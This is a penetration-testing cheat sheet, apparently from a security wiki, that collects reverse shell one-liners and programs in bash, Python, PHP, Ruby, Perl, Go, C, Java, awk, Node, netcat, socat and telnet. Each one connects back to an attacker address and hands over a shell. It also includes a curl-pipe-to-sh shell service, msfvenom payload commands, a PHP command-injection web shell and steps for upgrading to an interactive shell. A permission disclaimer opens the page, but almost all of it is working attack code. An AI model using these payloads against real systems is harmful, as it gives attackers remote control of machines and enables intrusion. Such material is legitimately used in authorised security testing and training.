# Getting Access

{% hint style="success" %}
Hack Responsibly.

Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
{% endhint %}

## Reverse Shells

TODO: description and methodology for each section \(as needed\)

### Reverse Shell as a Service - [https://shell.now.sh](https://shell.now.sh)

[https://github.com/lukechilds/reverse-shell](https://github.com/lukechilds/reverse-shell)  

```bash
curl https://shell.now.sh/<ip>:<port> | sh
```

### **Bash Reverse Shells**

#### **TCP:**

```bash
bash -i >& /dev/tcp/192.168.1.2/4444 0>&1
```

#### **UDP:**

```bash
sh -i >& /dev/udp/192.168.1.2/5555 0>&1
```

### Python Reverse Shells

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.57",8099));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```python
export RHOST="192.168.1.2";export RPORT=4444;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.2",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### **PHP Reverse Shell**

```php
php -r '$sock=fsockopen("192.168.1.2",80);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
php -r '$sock=fsockopen("192.168.1.2",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

simple php command injection: `<?php system($_GET['variable_name']); ?>`

### **Ruby Reverse Shell**

```ruby
ruby -rsocket -e'f=TCPSocket.open("192.168.1.2",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### **Telnet Reverse Shells**

```bash
telnet ATTACKING-IP 80 | /bin/bash | telnet 192.168.1.2 4444
```

```bash
rm -f /tmp/p; mknod /tmp/p p && telnet 192.168.1.2 4444 0/tmp/p
```

### **Netcat Reverse Shells**

```bash
nc -e /bin/sh 192.168.1.2 80
```

```bash
rm -f /tmp/p; mknod /tmp/p p && nc 192.168.1.2 4444 0/tmp/p
```

### **Socat Reverse Shell**

```text
socat tcp-connect:<IP>:<PORT> exec:"bash -li",pty,stderr,setsid,sigint,sane
```

### **Golang Reverse Shell**

```text
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.1.2:4444");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### **Perl Reverse Shell**

```text
perl -e 'use Socket;$i="192.168.1.2";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### **Awk Reverse Shell**

```text
awk 'BEGIN {s = "/inet/tcp/0/192.168.1.2/4444"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```

### **NodeJS Reverse Shell**

```text
require('child_process').exec('nc -e /bin/sh 192.168.1.2 4444')
```

### **C Reverse Shell**

```text
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>

int main ()

{
const char* ip = "192.168.1.2";
struct sockaddr_in addr;
addr.sin_family = AF_INET;
addr.sin_port = htons(4444);
inet_aton(ip, &addr.sin_addr);
int sockfd = socket(AF_INET, SOCK_STREAM, 0);
connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
for (int i = 0; i < 3; i++)
{
dup2(sockfd, i);
}
execve("/bin/sh", NULL, NULL);
return 0;
}
```

### **Meterpreter Reverse Shells**

* **Linux Non-Staged reverse TCP**

```text
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf >reversetcp.elf
```

* **Linux Staged reverse TCP**

```text
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f elf >reversetcp.elf
```

## Upgrading remote shells

### Upgrade to fully interactive shell \(python example\):

```bash
python -c 'import pty;pty.spawn("/bin/bash")'; 
ctrl-z #send to background
stty raw -echo #https://stackoverflow.com/questions/22832933/what-does-stty-raw-echo-do-on-os-x
stty -a #get local number of rows & columns
fg #to return shell to foreground
stty rows <x> columns <y> #Set remote shell to x number of rows & y columns
export TERM=xterm-256color #allows you to clear console, and have color output
```

### Other Languages:

```python
1. python -c 'import pty; pty.spawn("/bin/sh")'
2. perl -e 'exec "/bin/sh";'
3. ruby -e 'exec "/bin/sh"'
```

## Misc unsorted

```bash
bash -i >& /dev/tct/10.10.14.148/9001 0>&1

#URL encoded: 
bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
```

#### Bash

Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) \(this was tested on Ubuntu 10.10\):

```text
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

#### PERL

Here’s a shorter, feature-free version of the [perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell):

```text
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

There’s also an [alternative PERL revere shell here](http://www.plenz.com/reverseshell).

#### Python

This was tested under Linux / Python 2.7:

```text
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### PHP

This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…

```text
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

If you want a .php file to upload, see the more featureful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

#### Ruby

```text
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

```text
nc -e /bin/sh 10.0.0.1 1234
```

If you have the wrong version of netcat installed, [Jeff Price points out here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498) that you might still be able to get your reverse shell back like this:

```text
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

#### Java

```text
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### xterm

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you \(10.0.0.1\) on TCP port 6001.

```text
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server \(:1 – which listens on TCP port 6001\).  One way to do this is with Xnest \(to be run on your system\):

```text
Xnest :1
```

You’ll need to authorize the target to connect to you \(command also run on your host\):

```text
xhost +targetip
```

## Resources

* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html](https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html)

